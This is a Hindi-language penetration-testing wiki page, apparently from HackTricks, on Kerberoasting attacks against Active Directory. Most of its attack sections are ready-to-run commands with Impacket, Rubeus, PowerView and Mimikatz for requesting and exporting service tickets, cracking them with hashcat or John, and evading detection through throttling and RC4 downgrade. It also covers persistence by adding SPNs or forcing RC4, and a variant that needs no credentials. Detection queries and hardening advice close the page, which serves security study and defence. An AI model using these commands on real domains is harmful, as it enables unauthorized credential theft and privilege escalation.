# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting का ध्यान TGS टिकटों के अधिग्रहण पर केंद्रित है, विशेष रूप से उन सेवाओं से संबंधित जो Active Directory (AD) में उपयोगकर्ता खातों के तहत संचालित होती हैं, कंप्यूटर खातों को छोड़कर। इन टिकटों का एन्क्रिप्शन उन कुंजियों का उपयोग करता है जो उपयोगकर्ता पासवर्ड से उत्पन्न होती हैं, जिससे ऑफ़लाइन क्रेडेंशियल क्रैकिंग की अनुमति मिलती है। एक सेवा के रूप में उपयोगकर्ता खाते का उपयोग एक गैर-खाली ServicePrincipalName (SPN) प्रॉपर्टी द्वारा संकेतित किया जाता है।

कोई भी प्रमाणित डोमेन उपयोगकर्ता TGS टिकटों का अनुरोध कर सकता है, इसलिए किसी विशेष विशेषाधिकार की आवश्यकता नहीं है।

### Key Points

- उपयोगकर्ता खातों (यानी, SPN सेट वाले खाते; कंप्यूटर खातों नहीं) के तहत चलने वाली सेवाओं के लिए TGS टिकटों को लक्षित करता है।
- टिकटों को सेवा खाते के पासवर्ड से निकाली गई कुंजी के साथ एन्क्रिप्ट किया गया है और इन्हें ऑफ़लाइन क्रैक किया जा सकता है।
- कोई ऊंचे विशेषाधिकार की आवश्यकता नहीं है; कोई भी प्रमाणित खाता TGS टिकटों का अनुरोध कर सकता है।

> [!WARNING]
> अधिकांश सार्वजनिक उपकरण RC4-HMAC (etype 23) सेवा टिकटों का अनुरोध करना पसंद करते हैं क्योंकि इन्हें AES की तुलना में क्रैक करना तेज़ होता है। RC4 TGS हैश `$krb5tgs$23$*` से शुरू होते हैं, AES128 `$krb5tgs$17$*` के साथ और AES256 `$krb5tgs$18$*` के साथ। हालाँकि, कई वातावरण केवल AES की ओर बढ़ रहे हैं। केवल RC4 को प्रासंगिक मानने से बचें।
> इसके अलावा, "स्प्रे-एंड-प्रे" रोस्टिंग से बचें। Rubeus का डिफ़ॉल्ट kerberoast सभी SPNs के लिए टिकटों का अनुरोध कर सकता है और यह शोर करता है। पहले दिलचस्प प्रिंसिपल को सूचीबद्ध करें और लक्षित करें।

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
मल्टी-फीचर टूल्स जिनमें kerberoast जांच शामिल हैं:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable उपयोगकर्ताओं की गणना करें
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS के लिए पूछें और मेमोरी से डंप करें
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- तकनीक 2: स्वचालित उपकरण
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> एक TGS अनुरोध Windows सुरक्षा घटना 4769 (एक Kerberos सेवा टिकट अनुरोध किया गया था) उत्पन्न करता है।

### OPSEC और केवल AES वातावरण

- बिना AES के खातों के लिए जानबूझकर RC4 का अनुरोध करें:
- Rubeus: `/rc4opsec` tgtdeleg का उपयोग करके बिना AES वाले खातों को सूचीबद्ध करता है और RC4 सेवा टिकट का अनुरोध करता है।
- Rubeus: `/tgtdeleg` के साथ kerberoast भी संभव होने पर RC4 अनुरोधों को ट्रिगर करता है।
- चुपचाप विफल होने के बजाय केवल AES वाले खातों को भुनाएं:
- Rubeus: `/aes` उन खातों को सूचीबद्ध करता है जिनमें AES सक्षम है और AES सेवा टिकट का अनुरोध करता है (etype 17/18)।
- यदि आपके पास पहले से एक TGT है (PTT या .kirbi से), तो आप `/ticket:<blob|path>` का उपयोग `/spn:<SPN>` या `/spns:<file>` के साथ कर सकते हैं और LDAP को छोड़ सकते हैं।
- लक्षित करना, थ्रॉटलिंग और कम शोर:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` और `/jitter:<1-100>` का उपयोग करें।
- संभावित कमजोर पासवर्ड के लिए फ़िल्टर करें `/pwdsetbefore:<MM-dd-yyyy>` (पुराने पासवर्ड) या विशेषाधिकार प्राप्त OUs को लक्षित करें `/ou:<DN>`।

उदाहरण (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### क्रैकिंग
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

यदि आप एक खाते को नियंत्रित करते हैं या उसे संशोधित कर सकते हैं, तो आप एक SPN जोड़कर इसे kerberoastable बना सकते हैं:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
एक खाते को डाउनग्रेड करें ताकि RC4 को आसान क्रैकिंग के लिए सक्षम किया जा सके (लक्ष्य वस्तु पर लिखने के विशेषाधिकार की आवश्यकता होती है):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
आप Kerberoast हमलों के लिए उपयोगी उपकरण यहाँ पा सकते हैं: https://github.com/nidem/kerberoast

यदि आपको Linux से यह त्रुटि मिलती है: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` तो यह स्थानीय समय के अंतर के कारण है। DC के साथ समन्वय करें:

- `ntpdate <DC_IP>` (कुछ वितरणों पर अप्रचलित)
- `rdate -n <DC_IP>`

### Detection

Kerberoasting छिपा हुआ हो सकता है। DCs से Event ID 4769 के लिए शिकार करें और शोर को कम करने के लिए फ़िल्टर लागू करें:

- सेवा नाम `krbtgt` और `$` से समाप्त होने वाले सेवा नामों को बाहर करें (कंप्यूटर खाते)।
- मशीन खातों से अनुरोधों को बाहर करें (`*$$@*`)।
- केवल सफल अनुरोध (Failure Code `0x0`)।
- एन्क्रिप्शन प्रकारों को ट्रैक करें: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)। केवल `0x17` पर अलर्ट न करें।

उदाहरण PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
अतिरिक्त विचार:

- प्रत्येक होस्ट/उपयोगकर्ता के लिए सामान्य SPN उपयोग का आधार रेखा; एकल प्रिंसिपल से विभिन्न SPN अनुरोधों के बड़े विस्फोट पर अलर्ट करें।
- AES-हार्डन किए गए डोमेन में असामान्य RC4 उपयोग को फ्लैग करें।

### शमन / हार्डनिंग

- सेवाओं के लिए gMSA/dMSA या मशीन खातों का उपयोग करें। प्रबंधित खातों में 120+ वर्णों के यादृच्छिक पासवर्ड होते हैं और ये स्वचालित रूप से घुमाते हैं, जिससे ऑफ़लाइन क्रैकिंग व्यावहारिक नहीं होती।
- सेवा खातों पर AES को लागू करें `msDS-SupportedEncryptionTypes` को केवल AES (दशमलव 24 / हेक्स 0x18) पर सेट करके और फिर पासवर्ड को घुमाकर ताकि AES कुंजी निकाली जा सकें।
- जहां संभव हो, अपने वातावरण में RC4 को अक्षम करें और RC4 उपयोग के प्रयासों की निगरानी करें। DCs पर आप `DefaultDomainSupportedEncTypes` रजिस्ट्री मान का उपयोग कर सकते हैं ताकि उन खातों के लिए डिफ़ॉल्ट को निर्देशित किया जा सके जिनमें `msDS-SupportedEncryptionTypes` सेट नहीं है। पूरी तरह से परीक्षण करें।
- उपयोगकर्ता खातों से अनावश्यक SPNs को हटा दें।
- यदि प्रबंधित खाते संभव नहीं हैं तो लंबे, यादृच्छिक सेवा खाता पासवर्ड (25+ वर्ण) का उपयोग करें; सामान्य पासवर्ड पर प्रतिबंध लगाएं और नियमित रूप से ऑडिट करें।

### डोमेन खाते के बिना Kerberoast (AS-निर्धारित STs)

सितंबर 2022 में, चार्ली क्लार्क ने दिखाया कि यदि एक प्रिंसिपल को पूर्व प्रमाणीकरण की आवश्यकता नहीं है, तो KRB_AS_REQ को संशोधित करके सेवा टिकट प्राप्त करना संभव है, अनुरोध शरीर में sname को बदलकर, प्रभावी रूप से TGT के बजाय एक सेवा टिकट प्राप्त करना। यह AS-REP रोस्टिंग के समान है और इसके लिए मान्य डोमेन क्रेडेंशियल की आवश्यकता नहीं होती।

विवरण देखें: Semperis लेख “New Attack Paths: AS-requested STs”।

> [!WARNING]
> आपको उपयोगकर्ताओं की एक सूची प्रदान करनी होगी क्योंकि बिना मान्य क्रेडेंशियल के आप इस तकनीक के साथ LDAP को क्वेरी नहीं कर सकते।

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
संबंधित

यदि आप AS-REP भुनाने योग्य उपयोगकर्ताओं को लक्षित कर रहे हैं, तो देखें:

{{#ref}}
asreproast.md
{{#endref}}

## संदर्भ

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft का मार्गदर्शन Kerberoasting को कम करने में मदद करने के लिए: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting दस्तावेज़: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
